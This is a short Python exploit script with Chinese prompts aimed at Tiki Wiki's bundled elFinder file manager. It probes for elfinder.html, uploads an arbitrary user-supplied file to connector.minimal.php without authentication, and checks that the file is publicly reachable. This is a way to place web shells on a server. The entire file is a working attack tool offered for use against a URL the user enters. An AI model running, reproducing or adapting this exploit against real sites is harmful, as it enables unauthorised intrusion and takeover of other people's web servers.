#!/usr/bin/env python3
# -*- coding:utf-8 -*-
import requests


def check(url, port):
    parts = ['http://', url, ':', port, '/tiki/vendor_extra/elfinder/elfinder.html']
    target_url = ''.join('%s' % part for part in parts)
    print(target_url)
    r = requests.get(target_url)
    if (r.status_code == 200):
        print("检测成功,开始攻击")
        return True
    else:
        print("未检测到")
        return False


def exploit(url, port, filename):
    parts = ['http://', url, ':', port, '/tiki/vendor_extra/elfinder/php/connector.minimal.php']
    target_url = ''.join('%s' % part for part in parts)
    files = {'cmd': (None, 'upload'),
             'target': (None, 'l1_XA'),
             'upload[]': (filename, open(filename, 'rb'), 'application/octet-stream')
             }
    r = requests.post(target_url, files=files)


def check_success(url, port, filename):
    parts = ['http://', url, ':', port, '/tiki/vendor_extra/elfinder/files/', filename]

    target_url = ''.join('%s' % part for part in parts)
    r = requests.get(target_url)
    if (r.status_code == 200):
        print("上传成功~")
    else:
        print("上传失败")


if __name__ == '__main__':
    filename = input('请输入要上传的文件名（请把要上传的文件和tiki_exp.py放在同一个目录下： \n')
    url = input('请输入要攻击的url： \n')
    port = int(input("请输入网站的端口号:  \n"))
    if check(url, port):
        exploit(url, port, filename)
        check_success(url, port, filename)
